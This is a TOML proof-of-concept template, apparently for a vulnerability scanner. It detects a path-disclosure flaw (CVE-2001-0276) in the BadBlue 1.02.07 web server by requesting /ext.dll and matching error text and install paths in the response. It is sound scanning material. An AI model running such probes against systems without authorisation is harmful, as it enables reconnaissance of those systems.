[info]
author = "ave"
description = "验证 BadBlue 1.02.07 Personal Edition Web 服务器路径信息泄露漏洞。通过向 ext.dll 发送无参数的 HTTP GET 请求，检查响应体中是否泄露服务器物理路径。"
id = "POC-AVE-2001-0114"
name = "BadBlue ext.dll Path Disclosure PoC"
severity = "medium"
tags = ["ave-2001-0114"]
vuln_id = [
    "CVE-2001-0276",
    "AVE-2001-0114",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/ext.dll"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["Error:"]

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "badblue",
    "program files",
]
